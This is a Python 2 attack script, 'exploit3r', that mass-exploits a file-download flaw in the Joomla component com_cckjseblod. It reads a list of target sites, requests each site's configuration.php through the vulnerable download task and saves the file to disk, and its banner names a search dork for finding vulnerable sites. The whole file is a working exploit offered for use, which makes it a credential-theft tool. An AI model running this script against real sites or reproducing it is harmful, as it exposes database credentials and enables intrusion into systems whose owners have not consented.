#!/usr/bin/python
# -*- coding:utf-8 -*-
#
#
#
#        exploit3r - Joomla Auto configure Donwload ®
#   [+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+]
#[+]Name    : exploit3r                                   [+]
#[+]Author  : joker-security [ dev-labs ]                 [+]
#[+]Website : dev-labs.co                                 [+]
#[+]Github  : github.com/joker25000                       [+]
#[+]Channel : www.youtube.com/c/Professionalhacker25      [+]
#[+]Facebook: facebook.com/kali.linux.pentesting.tutorials[+] 
#   [+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+]

__author__ = "Joker_Security"

import urllib2
import argparse
import urlparse
import requests
import threading
import BeautifulSoup
import time, sys , os
os.system('clear')

def clear():
    if system() == 'Linux':
        os.system("clear")
    if system() == 'Windows':
        os.system('cls')
        os.system('color a')
    else:
        pass 
class couleur():
    vert = "\033[92m"
    blanc = "\033[96m"
    rouge= "\033[91m"

def slowprint(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush() 
        time.sleep(8./90)

print"""
                                             #####         \033[96m
 ###### #    # #####  #       ####  # ##### #     # #####  
 #       #  #  #    # #      #    # #   #         # #    # \033[91m
 #####    ##   #    # #      #    # #   #    #####  #    # 
 #        ##   #####  #      #    # #   #         # #####  \033[92m
 #       #  #  #      #      #    # #   #   #     # #   #  
 ###### #    # #      ######  ####  #   #    #####  #    #®      """
parser = argparse.ArgumentParser(description='exploit3r - Joomla Auto Configure Donwload ')
parser.add_argument('-t','--targets', action='store',help='--targets joomla.txt')
hacker = parser.parse_args()



class Banner():
	joker = '''
                                             #####         \033[96m
 ###### #    # #####  #       ####  # ##### #     # #####  
 #       #  #  #    # #      #    # #   #         # #    # \033[91m
 #####    ##   #    # #      #    # #   #    #####  #    # 
 #        ##   #####  #      #    # #   #         # #####  \033[92m
 #       #  #  #      #      #    # #   #   #     # #   #  
 ###### #    # #      ######  ####  #   #    #####  #    #®  
             [[..::Name : exploit3r ::..]]                                 
          [[..::Author : Joker-Security ::..]]               \033[91m
           [[..::Website : dev-labs.co ::..]]                             
          [[..::Github : github.com/joker25000 ::..]]                \033[96m 
     ....................................................
   [[..:: exploit3r - Joomla Auto Configure Donwload ::..]]  
     ....................................................          
              ® DOrk: inurl:option=com_cckjseblod®              \033[92m       
'''
if not hacker.targets:
	os.system('clear')
	print couleur.rouge+Banner.joker
	slowprint("\033[96m[*] Usage: ")
	slowprint("\033[91mpython exploit3r.py -h")
	slowprint("\033[96mpython exploit3r.py -t Joomla.txt")
	slowprint("\033[92mpython exploit3r.py --targets Joomla.txt")
	print ''
	exit()

class Joomla_Auto_Configure_Donwload(threading.Thread):
	def __init__(self, targets):
		threading.Thread.__init__(self)
		targets = open(targets, 'r').readlines()
		self.targets = targets
		self.process = None
	def run(self):
		try:
			joker = 0 + 1
			print("\033[91m exploit3r - Joomla Auto Configure Donwload")
			for achraf in self.targets:
				try:
					achraf = achraf.strip()
					exploit3r = "/?option=com_cckjseblod&task=download&file=configuration.php"
					csc = str(achraf+exploit3r)
					try:
						path = urlparse.urlparse(achraf).path
						kader = achraf.replace(path, "")
						title = requests.get(kader)
					except:
						title = requests.get(achraf)
					exploit = urllib2.urlopen(csc)

					sanfour = BeautifulSoup.BeautifulSoup(title.content.decode('utf-8','ignore'))
					algeria = str(sanfour.title.text)
					with open(sanfour.title.text+".php","wb") as folder:
						folder.write(exploit.read())
					print "\033[92m]+[:::]-[:::]-[:::]-[:::]-[:::]-[ Information Exploit :]-[:::]-[:::]-[:::]-[:::]"
					print "\033[92m[+] Target -> {}".format(couleur.rouge+kader)
					print "\033[92m[+] Name -> {}".format(couleur.rouge+algeria)
					slowprint("\033[96m]+[:::]-[:::]-[:::]-[:::]-[:::]-[:::]-[:::]-[:::]-[:::]-[:::][:::]-[:::]-[:::]")
					try:
						print "\033[92m[+] Server -> {}".format(str(couleur.rouge+title.headers['server']))
					except:
						pass
					print "\033[92m[+] Exploit3r -> {}".format(couleur.rouge+exploit3r)
					print "\033[92m[+] Config Saved ->"+couleur.rouge+"/exploit3r/name.php"
					print "\033[92m]+[:::]-[:::]-[:::]-[:::]-[:::]-[:::]-[:::]-[:::]-[:::]-[:::]-[:::]-[:::]-[:::]"
					print "\033[91m]+------------------------------------------------------------------------------+"
					print ''
					joker = joker + 1
				except KeyboardInterrupt:
					print"\033[91mExiting"
					sys.exit(1)
				except Exception as Error:
					print "Error as {}".format(Error)
					pass
			slowprint("\033[92m[!] Total Exploit Found: %s" % str(joker))
			sys.exit(1)
		except KeyboardInterrupt:
			print "Exiting...."
			sys.exit(1)

def main():
	try:
		threads = 1
		for host in range(int(threads)):
			x = Joomla_Auto_Configure_Donwload(hacker.targets)
			x.daemon=True
			x.start()
			while True: time.sleep(100)
	except (KeyboardInterrupt, SystemExit):
		print"\033[91mExiting exploit3r...."
		
if __name__ == '__main__':
	try:
		main()
	except Exception as Error:
		print"[!] Error as %s" % Error
		exit()
	except KeyboardInterrupt:
		slowprint("\033[91m[!] Keyboard as Interrupt....")
		exit()

